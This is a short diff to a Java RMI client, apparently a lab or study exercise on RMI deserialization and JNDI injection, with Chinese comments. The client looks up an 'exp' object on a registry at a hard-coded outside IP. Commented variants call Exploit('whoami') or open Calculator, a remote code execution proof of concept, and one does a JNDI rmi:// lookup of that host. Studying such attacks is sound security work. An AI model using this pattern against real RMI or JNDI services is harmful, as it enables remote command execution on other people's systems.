@@ -14,13 +14,24 @@ public class RMIClient{
     public static void main(String[] args) throws IOException, NotBoundException {
         System.out.println("RMIClient ready!");
         Registry registry = LocateRegistry.getRegistry("39.108.244.167",1099);
-        //EXP exp = (EXP) registry.lookup("exp");
-        //System.out.println(exp.Exploit("whoami"));
-        //System.out.println(exp);
+
+        //RMI自动反序列化readObject()
         Object obj = (Object) registry.lookup("exp");
         System.out.println(obj);
-        //new InitialContext().lookup("rmi://39.108.244.167:1099/exp");
 
+        //远程调用
+        /*
+        EXP exp = (EXP) registry.lookup("exp");
+        System.out.println(exp.Exploit("whoami"));
+        System.out.println(exp);
+        */
+
+        //rmi of jndi
+        /*
+        new InitialContext().lookup("rmi://39.108.244.167:1099/exp");
+        */
+
+        //Naming快捷方法
         /*
         EXP exp = (EXP) Naming.lookup("rmi://:1099/exp");
         exp.Exploit("open /System/Applications/Calculator.app");
